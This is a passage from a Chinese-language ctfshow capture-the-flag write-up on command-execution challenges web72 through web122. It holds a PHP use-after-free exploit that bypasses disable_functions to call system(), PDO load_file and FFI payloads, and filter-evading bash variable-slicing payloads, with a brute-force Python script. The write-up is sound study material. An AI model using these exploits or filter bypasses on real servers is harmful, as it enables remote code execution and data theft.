Helper;</span><br><span class="line">    $helper-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params">$x</span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen($abc) == <span class="number">79</span> || strlen($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); </span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctfshow(<span class="string">&quot;cat /flag0.txt&quot;</span>);ob_end_flush();</span><br><span class="line"><span class="comment">#需要通过url编码哦</span></span><br></pre></td></tr></table></figure>
<p>通过burpsuite抓包，然后把post的c替换成exp，接着按照图中所示步骤进行url编码<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web72/QY87%60Y%6055E%29Y_VI_AVTW294.png" alt=""><br>
发送数据包后可获得flag</p>
<h3 id="web73"><a class="header-anchor" href="#web73">¶</a>web73</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,$s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>老规矩，先看目录，肯定又改名了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br></pre></td></tr></table></figure>
<p>果然，flag文件现在是flagc.txt，先尝试能不能读取，好家伙，能直接读取，payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;include(&quot;&#x2F;flagc.txt&quot;);exit();</span><br></pre></td></tr></table></figure>
<h3 id="web74"><a class="header-anchor" href="#web74">¶</a>web74</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,$s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br></pre></td></tr></table></figure>
<p>这次flag在flagx.txt里，payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;include(&quot;&#x2F;flagx.txt&quot;);exit();</span><br></pre></td></tr></table></figure>
<h3 id="web75"><a class="header-anchor" href="#web75">¶</a>web75</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,$s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br></pre></td></tr></table></figure>
<p>这次flag在flag36.txt里，好家伙又读取不成功开始限制了，后来看了下hint，这题用的mysql的load_file进行读取文件，payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;try &#123;$dbh &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;ctftraining&#39;, &#39;root&#39;,</span><br><span class="line">&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;&#x2F;flag36.txt&quot;)&#39;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh &#x3D; null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure>
<p>还是在burpsuite中进行url编码后发包拿到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web75/0W2_V3__ZICVWGSHCN53GJF.png" alt=""></p>
<h3 id="web76"><a class="header-anchor" href="#web76">¶</a>web76</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,$s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br></pre></td></tr></table></figure>
<p>这次发现flag在flag36d.txt中，还是上题老套路，用load_file读取文件，payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;try &#123;$dbh &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;ctftraining&#39;, &#39;root&#39;,</span><br><span class="line">&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;&#x2F;flag36d.txt&quot;)&#39;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh &#x3D; null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure>
<p>记得进行url编码，发包后得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web76/F%24%40QVT1OP_H%604N%29VZF_%28T37.png" alt=""></p>
<h3 id="web77"><a class="header-anchor" href="#web77">¶</a>web77</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,$s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续读取目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web77/S6%25~_S%60_K%40WD%60%25WFTJ%5BKK%7BN.png" alt=""><br>
发现一个flag36x.txt和readflag，题目提示了php7.4，搜了一下是利用FF1拓展(php7.4开始才有)，payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;?&gt;&lt;?php $ffi &#x3D; FFI::cdef(&quot;int system(const char *command);&quot;);$ffi-&gt;system(&quot;&#x2F;readflag &gt;flag.txt&quot;);exit();</span><br></pre></td></tr></table></figure>
<p>这里flag36x.txt读取不出来没有回显，所以利用readflag那个文件，把他输出到新文件flag.txt中<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web77/6A6%7DHTF3SLM%7D7%40C~F%5DY0LLE.png" alt=""><br>
接着访问flag.txt就可以获得flag了<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web77/ONRI4J8%29WFX9K8%40_%257S%5BFA4.png" alt=""></p>
<h3 id="web118"><a class="header-anchor" href="#web118">¶</a>web118</h3>
<p>题目提示flag在flag.php中，打开页面，有一个输入框<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web118/BT%25VT%409XZ0M%40I7%24WYUDF%25V0.png" alt=""><br>
右键查看源码提示是:<code>system($code);</code>，fuzz尝试之后发现只有大写字母和${}:?.~等等字符可以通过，可以使用bash内置变量进行利用<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web118/CIVB%240HL%7B%5B%5D%29X_%5B_8S8_AT8.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# echo $&#123;PWD&#125; </span><br><span class="line">&#x2F;root</span><br><span class="line">                                                                                                      </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# echo $&#123;PWD:0:1&#125;      #表示从0下标开始的第一个字符</span><br><span class="line">&#x2F;                                                                                                                                                                                       </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# echo $&#123;PWD:~0:1&#125;      #从结尾开始往前的第一个字符</span><br><span class="line">t</span><br><span class="line">                                                                                </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# echo $&#123;PWD:~0&#125;      </span><br><span class="line">t</span><br><span class="line">                                                                             </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# echo $&#123;PWD:~A&#125;       #所以字母和0具有同样作用             </span><br><span class="line">t</span><br><span class="line">                                                                    </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# echo $&#123;PATH&#125;                            </span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</span><br><span class="line">                                                                    </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# echo $&#123;PATH:~A&#125;                </span><br><span class="line">n</span><br><span class="line">                                                                                                    </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# ls                                      </span><br><span class="line">Desktop  Documents  Downloads  flag.txt  Music  Pictures  Public  Templates  Videos</span><br><span class="line">                                                                                              </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# $&#123;PATH:~A&#125;l flag.txt</span><br><span class="line">     1  flag&#123;test&#125;</span><br><span class="line">                    </span><br></pre></td></tr></table></figure>
<p>从中发现我们可以构造出nl命令进行读取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;$&#123;PATH&#125;</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</span><br><span class="line"></span><br><span class="line">$&#123;PWD&#125;</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html</span><br><span class="line"></span><br><span class="line">所以payload为</span><br><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web118/BT%25VT%409XZ0M%40I7%24WYUDF%25V0.png" alt=""><br>
然后右键源码得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web118/T%5DH9NIZHXVX%5BQ8R%24FVBF~6B.png" alt=""></p>
<h3 id="web119"><a class="header-anchor" href="#web119">¶</a>web119</h3>
<p>这次在前面的基础上把path给禁了，也就是我们无法获得n这个字母，也就无法构成了nl命令。接下来我们尝试构造一下<code>/bin/cat</code>，而想要匹配到我们至少需要一个<code>/</code>符号和一个<code>cat</code>中的一个字母，这里使用<code>$&#123;SHLVL&#125;</code>来配合构造<code>/</code></p>
<blockquote>
<p>SHLVL 是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时${SHLVL}=1，然后在此shell中再打开一个shell时$SHLVL=2。</p>
</blockquote>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web119/PD59VJBEX0%294%5DVX%4082PHKLD.png" alt=""><br>
一般给的权限都是www-data，所以我们用<code>$&#123;USER&#125;</code>可以获得“www-data”，而我们要取到at的话需要<code>$&#123;USER:~2:2&#125;</code>，但数字是被禁了，所以接下来我们还需要想想怎么构造出2，翻了翻，这要什么来什么了，看见php的版本是7.3.22，正好包含数字2，所以利用<code>PHP_VERSION</code><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web119/3%60%40_Y1%241%5DVGXB1YAX_O%40YZL.png" alt=""><br>
所以思路很清晰了，构造payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???</span><br></pre></td></tr></table></figure>
<p>回车后右键源码看到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web119/~V_%29Z5%7D%284%247%401WZ%5BKKT_KPC.png" alt=""></p>
<h3 id="web120"><a class="header-anchor" href="#web120">¶</a>web120</h3>
<p>这次变成源码了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $code=$_POST[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, $code))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(strlen($code)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.system($code).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这次限制payload长度在65以内，上题我们payload达到99的长度，所以我们适当减少一下，我们就不取www-data中的at，只取a进行匹配，好家伙那我上题还想半天构造数字2(太菜了)，尝试构造如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br><span class="line"></span><br><span class="line">但发现长度是66还是超了，接着我们把$&#123;#&#125;去掉，也是可以的，最终payload如下：</span><br><span class="line"></span><br><span class="line">code&#x3D;$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br></pre></td></tr></table></figure>
<p>右键源码得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web120/%5D%400%402N%25U%28%242%29DRO2%7BW%29ELWU.png" alt=""></p>
<h3 id="web121"><a class="header-anchor" href="#web121">¶</a>web121</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $code=$_POST[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, $code))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(strlen($code)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.system($code).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
<p>这次把USER给禁了，首先我们现在可以利用的是PWD，也就是“/var/www/html”，对应了一下bin中的命令，发现我们可以取r来构造<code>/bin/rev</code>取反命令读取文件，也就是我们需要构造出<code>$&#123;PWD:3:1&#125;</code>的效果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里我们可以用$&#123;IFS&#125;和$&#123;#&#125;分别替代</span><br><span class="line"></span><br><span class="line">$&#123;#IFS&#125;在ubuntu等系统中值为3，我在kali中测试值为4</span><br><span class="line"></span><br><span class="line">$&#123;#&#125;为添加到shell的参数个数，$&#123;##&#125;则为值</span><br></pre></td></tr></table></figure>
<p>所以构成payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code&#x3D;$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;##&#125;&#125;?? ????.???</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web121/%28Q6E%60%5BJ3U4RPV9O%29RWZA%60NV.png" alt=""><br>
接着去kali里面再取反一次即可得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web121/R%60WY22FV%40%25ZUY5%5BSK%7BRT%25%7DH.png" alt=""></p>
<h3 id="web122"><a class="header-anchor" href="#web122">¶</a>web122</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $code=$_POST[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, $code))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(strlen($code)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.system($code).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
<p>这次把<code>PWD</code>和<code>#</code>都给禁了😢，这次我们换另一个命令<code>/bin/base64</code>，这次放开了HOME，我们就用HOME来获取<code>/</code>，数字1的话我们没法使用<code>$&#123;##&#125;</code>了，这里使用<code>$?</code></p>
<blockquote>
<p><code>$?</code> 最后运行的命令的结束代码（返回值）即执行上一个指令的返回值 (显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误)</p>
</blockquote>
<p>这里找了几个报错资料和对应的值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;OS error code   1:  Operation not permitted&quot;</span><br><span class="line">&quot;OS error code   2:  No such file or directory&quot;</span><br><span class="line">&quot;OS error code   3:  No such process&quot;</span><br><span class="line">&quot;OS error code   4:  Interrupted system call&quot;</span><br><span class="line">&quot;OS error code   5:  Input&#x2F;output error&quot;</span><br><span class="line">&quot;OS error code   6:  No such device or address&quot;</span><br><span class="line">&quot;OS error code   7:  Argument list too long&quot;</span><br><span class="line">&quot;OS error code   8:  Exec format error&quot;</span><br><span class="line">&quot;OS error code   9:  Bad file descriptor&quot;</span><br><span class="line">&quot;OS error code  10:  No child processes&quot;</span><br></pre></td></tr></table></figure>
<p>利用<code>&lt;A</code>的报错就能返回值1，根据题目fuzz提示，后面的base64中的4我们可以利用<code>$&#123;RANDOM&#125;</code>来获得(因为具有随机性，所以要多尝试直到随机出4来)，到这里思路很清晰了，构造payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code&#x3D;&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???</span><br></pre></td></tr></table></figure>
<p>写个脚本来跑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/19 12:17</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://3f405f9a-8ca5-4519-aef8-95943df5d5de.chall.ctf.show:8080/&quot;</span></span><br><span class="line">data = &#123;<span class="string">&#x27;code&#x27;</span>: <span class="string">r&#x27;&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    result = requests.post(url=url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;PD9waHA&quot;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">        print(result.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web122/D%40_HYTR%28%5B9%7D6%29KJBT45VBDF.png" alt=""><br>
再进行base64解码即可得到flag</p>
<h3 id="web124"><a class="header-anchor" href="#web124">¶</a>web124</h3>
